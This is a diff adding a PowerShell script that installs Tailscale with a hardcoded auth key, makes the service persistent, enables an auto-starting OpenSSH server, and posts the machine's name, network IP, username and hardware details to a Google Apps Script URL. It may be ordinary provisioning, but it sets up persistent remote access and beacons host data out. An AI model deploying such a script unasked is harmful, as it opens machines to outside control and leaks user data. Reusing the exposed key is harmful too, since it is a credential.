@@ -1,0 +1,44 @@
+winget install --id Tailscale.Tailscale -e
+
+tailscale up --authkey=tskey-auth-k7M4zrRzZ911CNTRL-nPuWFmmhy7bAKLtdczb87b8bVHAMV1dQ7
+
+sc.exe config Tailscale start= auto
+
+sc.exe failure Tailscale reset= 0 actions= restart/5000
+
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
+
+Start-Service sshd
+
+Set-Service -Name sshd -StartupType Automatic
+
+$URL = "https://script.google.com/macros/s/AKfycbxgICZt5BO7bioRfM64L51izipqX15oDbeQF2EddZ7aAldoWxoHEBOUp0D1UowXNiuQTA/exec"
+
+$body = @{
+    host           = $env:COMPUTERNAME
+    tailscale_ip   = (tailscale ip -4)
+    username       = $env:USERNAME
+    os             = (Get-CimInstance Win32_OperatingSystem).Caption
+
+    ram   = [math]::Round(
+                        (Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB,
+                        2
+                     )
+
+    storage = [math]::Round(
+                          (
+                            (Get-CimInstance Win32_LogicalDisk |
+                             Where-Object { $_.DriveType -eq 3 } |
+                             Measure-Object -Property Size -Sum
+                            ).Sum
+                          ) / 1GB,
+                          2
+                       )
+
+} | ConvertTo-Json
+
+Invoke-RestMethod `
+    -Uri $URL `
+    -Method POST `
+    -ContentType "application/json" `
+    -Body $body
